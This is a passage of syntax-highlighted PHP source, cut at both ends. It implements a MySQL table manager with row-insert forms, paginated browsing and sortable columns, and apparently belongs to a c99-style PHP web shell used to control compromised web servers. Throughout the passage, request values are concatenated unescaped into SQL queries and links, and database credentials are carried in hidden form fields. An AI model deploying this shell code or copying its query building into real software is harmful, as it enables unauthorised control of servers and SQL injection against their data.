            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sql_tbl_insert</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_insert</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_radio</span><span class="p">))</span> <span class="p">{</span>  <span class="p">}</span> <span class="c1">//Not Ready</span>
            <span class="k">else</span> <span class="p">{</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Inserting row into table:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$sql_query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
                <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; WHERE&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_insert_q</span><span class="p">;</span>
                <span class="nv">$sql_query</span> <span class="o">.=</span> <span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">;</span>
                <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
                <span class="nv">$values</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
                <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
              <span class="p">}</span>
              <span class="k">else</span> <span class="p">{</span><span class="nv">$values</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;table width=</span><span class="se">\&quot;</span><span class="s2">1%</span><span class="se">\&quot;</span><span class="s2"> border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Field&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Type&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Function&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct_fields</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span>
                <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Type&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_functs[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PASSWORD&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;MD5&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;ENCRYPT&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;ASCII&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CHAR&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;RAND&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;LAST_INSERT_ID&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;COUNT&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;AVG&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;SUM&amp;lt;/option&amp;gt;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;--------&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;SOUNDEX&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;LCASE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;UCASE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;NOW&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CURDATE&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CURTIME&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;FROM_DAYS&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;FROM_UNIXTIME&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PERIOD_ADD&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;PERIOD_DIFF&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;TO_DAYS&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;UNIX_TIMESTAMP&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;USER&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;WEEKDAY&amp;lt;/option&amp;gt;&amp;lt;option&amp;gt;CONCAT&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert[&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=50&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
                <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
              <span class="p">}</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; checked&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;gt;&amp;lt;b&amp;gt;Insert as new row&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot; or &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">radio</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_radio</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">2</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;b&amp;gt;Save&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_insert_q</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl_insert_q</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;browse&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">);</span>
            <span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=multipage</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">12</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Pages</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
            <span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$numpages</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
              <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="k">echo</span> <span class="nv">$i</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_ls</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$i</span><span class="o">*</span><span class="nv">$perpage</span><span class="o">+</span><span class="nv">$perpage</span> <span class="o">!=</span> <span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="k">if</span> <span class="p">((</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span> <span class="o">==</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="mi">30</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;nbsp;&quot;</span><span class="p">;}</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;empty&quot;</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">GET</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_order</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_order</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;From:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_ls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;b&amp;gt;To:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl_le</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">View</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=</span><span class="se">\&quot;</span><span class="s2">1%</span><span class="se">\&quot;</span><span class="s2"> bgcolor=#000000 borderColorLight=#c0c0c0 border=1&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow_all</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
              <span class="nv">$v</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;asc&quot;</span><span class="p">;}</span>
              <span class="k">else</span> <span class="p">{</span><span class="nv">$s</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;</span> <span class="nv">$m</span> <span class="o">=</span> <span class="s2">&quot;desc&quot;</span><span class="p">;}</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;a&quot;</span><span class="p">;}</span>
              <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;%20&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_order=&quot;</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s2">&quot;%20&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_&quot;</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">9</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">14</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$m</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
           <span class="nv">$w</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
           <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
           <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span> <span class="nv">$w</span> <span class="o">.=</span> <span class="s2">&quot; `&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;` = &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; AND&quot;</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">;}</span>
           <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="nv">$w</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$w</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">);}</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxrow[]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
